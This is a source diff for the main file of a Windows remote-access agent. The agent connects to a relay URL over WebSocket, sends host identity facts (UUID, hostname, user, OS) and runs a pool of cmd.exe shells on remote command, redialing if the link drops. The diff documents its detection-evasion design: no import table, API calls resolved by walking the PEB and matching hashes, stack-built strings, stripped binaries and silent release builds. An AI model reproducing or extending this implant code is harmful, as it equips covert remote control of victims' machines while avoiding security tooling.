@@ -19,40 +19,62 @@
  *               Only the Exit command (or killing the process) ends it;
  *               live shells survive a redial.
  *
- * Build - the single flavor is DEPENDENCY-FREE: no CRT, no import table,
- * no -lwinhttp. Every OS call (WinHTTP included) is resolved at runtime
- * from the PEB; the process starts at our own entry (entry.c), not the
- * CRT startup. Two steps - compile, then link:
+ * Build - the single flavor is DEPENDENCY-FREE: no CRT, no import
+ * table, no -lwinhttp. Every OS call (WinHTTP included) is resolved at
+ * runtime from the PEB; the process starts at our own entry (entry.c),
+ * not the CRT startup. Strings live as hash constants (apihash.h) or are
+ * built on the stack (stackstrings.h); nothing is static, so there is no
+ * .bss. Two steps - compile, then link (PowerShell, from the repo root;
+ * the full story lives in README.md):
  *
- *   gcc -O2 -c main.c transport.c shell.c report.c system_facts.c \
- *       winhttp_api.c memory.c string.c kernel32.c advapi.c ntdll.c \
- *       peb.c system.c djb2.c logger.c entry.c freestanding.c
- *   gcc -O2 -s -nostdlib -e entry -o minimal_agent.exe \
- *       entry.o main.o transport.o shell.o report.o system_facts.o \
- *       winhttp_api.o memory.o string.o kernel32.o advapi.o ntdll.o \
- *       peb.o system.o djb2.o logger.o freestanding.o
+ *   gcc -O2 -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident \`
+ *       -c entry.c main.c transport.c shell.c report.c system_facts.c \`
+ *       winhttp_api.c ntdll.c kernel32.c advapi.c string.c memory.c \`
+ *       peb.c system.c djb2.c logger.c
+ *   New-Item -ItemType Directory -Force obj | Out-Null
+ *   Move-Item *.o obj
+ *   gcc -O2 -s -fno-asynchronous-unwind-tables -fno-shrink-wrap \`
+ *       -fno-ident -nostdlib -e entry -o minimal_agent.exe \`
+ *       (Get-ChildItem obj\*.o | ForEach-Object FullName)
+ *
+ * The two -fno-* flags are a PAIR: dropping the unwind tables frees the
+ * compiler to shrink-wrap prologues, and the code GROWS by 1 KB; the
+ * companion flag forbids that. For a dev build that talks (a release
+ * build is silent by design), add -DLOGGING_ENABLED to BOTH the compile
+ * and the link step and give the exe a distinct name, e.g.
+ * minimal_agent_dev.exe - the full command pair is in README "Run".
  *
  * (entry.c MUST be in the object list and -e entry names the real entry
- *  point - omitting either leaves ___chkstk_ms unresolved or the entry
- *  address pointing at the wrong symbol. Verify with:
- *  objdump -f minimal_agent.exe | grep "start address" vs nm entry)
+ *  point - omitting either leaves the entry address pointing at the
+ *  wrong symbol. Verify after linking:
+ *  objdump -f minimal_agent.exe | findstr /C:"start address"  vs
+ *  nm on an unstripped check copy - see README "gates".)
  *
  * Run:
- *   minimal_agent.exe <URL>        e.g. ... https://relay.example.com/agent
- *   minimal_agent.exe <URL> -v     verbose: dump every command's raw bytes
+ *   minimal_agent.exe <URL>      e.g. ... https://relay.example.com/agent
+ *   minimal_agent.exe <URL> -v   verbose (dev builds): dump each command
  *
  * The URL comes only from the command line; nothing is hardcoded.
  *
  * ============================================================================
  * Module map (one header = one topic)
  * ============================================================================
- *   main.c           this file - connect, dispatch, cleanup (main)
+ *   main.c           this file - agent_main: dial, dispatch, redial
+ *   entry.c/.h       the real process entry (no CRT startup)
  *   protocol.h       opcodes, statuses, identity frame, capability mask
  *   wire.h           tiny little-endian writers (header-only)
  *   transport.h/.c   the WebSocket pipe: ws_send / ws_receive
  *   shell.h/.c       the cmd.exe pool: spawn / read / write / teardown
- *   report.h/.c      human-facing output: errors, hex dumps, decoders
+ *   report.h/.c      terminal diagnostics (gone unless LOGGING_ENABLED)
  *   system_facts.h/.c  machine UUID + hostname/user/OS facts
+ *   winhttp_api.h/.c the WinHTTP table + its LdrLoadDll bootstrap
+ *   kernel32/ntdll/advapi  one resolved function table per DLL
+ *   peb.h/.c         TEB/PEB access, loader module-list walk
+ *   system.h/.c      export resolve - by name and by hash
+ *   apihash.h        precomputed djb2 constants for every name
+ *   stackstrings.h   runtime strings, built on the stack
+ *   djb2.h/.c        the hash both resolve paths share
+ *   string/memory/logger   the hand-rolled CRT replacements
  */
 
 #include "winhttp_api.h"   /* runtime-resolved WinHTTP table (no <winhttp.h>) */
@@ -70,7 +92,7 @@
 #include "logger.h"
 #include "kernel32.h"
 #include "entry.h"      /* agent_main: the -nostdlib entry contract */
-#include "stackstrings.h" /* C1 step 3b: functional strings built on the stack */
+#include "stackstrings.h" /* runtime strings, built on the stack */
 
 
 /* Commit tag baked into the identity frame. CI overrides it with
@@ -131,9 +153,10 @@ static int build_identity_frame(unsigned char frame[IDENTITY_FRAME_SIZE],
  * Command handlers (one reply per request, except Exit)
  * ======================================================================== */
 
-/* C1 step 2: process-lifetime state lives on agent_main's frame in one
- * context struct, passed down as a single pointer (the seed of the
- * platform-context pattern; a file-static would be .bss). */
+/* Everything that must outlive a single function call, gathered into
+ * one struct owned by agent_main's frame (which never returns until
+ * the agent exits) and passed down as a single pointer. No file-scope
+ * state, no .bss - the frame IS the global. */
 typedef struct {
     shell_slot *shells;     /* the pool array, owned by agent_main   */
     int verbose;            /* -v: dump every command's raw bytes    */
@@ -232,7 +255,8 @@ static DWORD handle_read_shell(const agent_ctx *ctx, HINTERNET socket, const inc
         if (err == NO_ERROR)
             LOG_ERROR("Read shell %llu - unknown id, status 1\n", id);
     } else {
-        /* C1 step 2: 64K+5 on the frame - chkstk probes it, .bss not needed */
+        /* [status:4][chunk][NUL] reply, 64K+5 on the frame; the prologue's
+         * stack probe makes a frame this large legal. */
         unsigned char chunk[4 + SHELL_READ_CHUNK + 1];
         DWORD got = 0;
         int r = shell_read(slot, chunk + 4, SHELL_READ_CHUNK, &got);
@@ -297,7 +321,7 @@ INT32 agent_main(INT32 argc, CHAR *argv[])
     }
    
     const CHAR *url_arg = NULL;
-    int verbose_flag = 0;   /* C1 step 2: folded into ctx below */
+    int verbose_flag = 0;   /* -v; travels into ctx below */
     int start = (argc >= 2) ? 1 : 0;
     for (int i = start; i < argc; i++) {
         if (strcmp(argv[i], "-v") == 0) {
@@ -317,18 +341,20 @@ INT32 agent_main(INT32 argc, CHAR *argv[])
         return 1;
     }
 
-    /* C1 step 2: process-lifetime storage lives ON THIS FRAME. agent_main
-     * does not return until the agent exits, so these locals ARE the
-     * process globals - without a byte of .bss. */
+    /* Process-lifetime storage, in declaration order of first use:
+     * the URL, the shell pool, the redial backoff steps and the context
+     * that bundles them for the call tree. agent_main does not return
+     * until the agent exits, so these frame locals live as long as any
+     * static would - without a byte of static storage. */
     WCHAR url[2048];
     shell_slot shells[SHELL_POOL_SIZE];
-    /* C1 step 3b follow-up: an INITIALIZED frame array is still .rdata -
-     * the compiler pools the constants and memcpy's them in (caught live:
-     * the blob died reading the pooled {1,2,4,8,16,32}). Scalar writes only. */
+    /* Uninitialized on purpose: an array initializer like {1,2,4,8,16,32}
+     * counts as initialized DATA - the compiler pools it and copies it
+     * in (one SIMD load from a constant pool). Filling it through the
+     * volatile pointer below keeps every step an instruction. */
     int backoff_steps[6];
-    /* volatile WRITES (trap: scalar const-array init still pools into
-     * .rdata as one movdqu - seen live in the blob harness). Writing
-     * through a volatile pointer keeps each store an instruction. */
+    /* volatile pointer: plain scalar stores would be re-recognized as an
+     * array initializer and pooled; volatile keeps them stores. */
     volatile int *bs = backoff_steps;
     bs[0] = 1;  bs[1] = 2;  bs[2] = 4;  bs[3] = 8;  bs[4] = 16; bs[5] = 32;
     const int backoff_count = 6;
@@ -406,7 +432,7 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
     MemoryZero(&uc, sizeof(uc));
     uc.dwStructSize = sizeof(uc);
 
-    WCHAR host[256];   /* C1 step 2: frame-local, probes pay for size */
+    WCHAR host[256];   /* WinHttpCrackUrl output buffers */
     WCHAR path[2048];
     uc.lpszHostName    = host;  uc.dwHostNameLength = 256;
     uc.lpszUrlPath     = path;  uc.dwUrlPathLength  = 2048;
@@ -486,7 +512,9 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
     /* ----- Stage 4: serve commands. Every request gets exactly one reply
      * - except Exit, which gets none and terminates the agent. ----- */
     LOG_INFO("[2] Agent mode: replying to commands (capability mask = Shell)...\n");
-    incoming_message msg;   /* C1 step 2: 64K receive buffer on the frame */
+    /* One incoming command, assembled here across fragments. Declared
+     * outside the loop: 64K of frame is paid once per session. */
+    incoming_message msg;
     for (int index = 1; ; index++) {
         *long_lived = 1;                /* a command arrived on this wire */
         BOOL closed = FALSE;
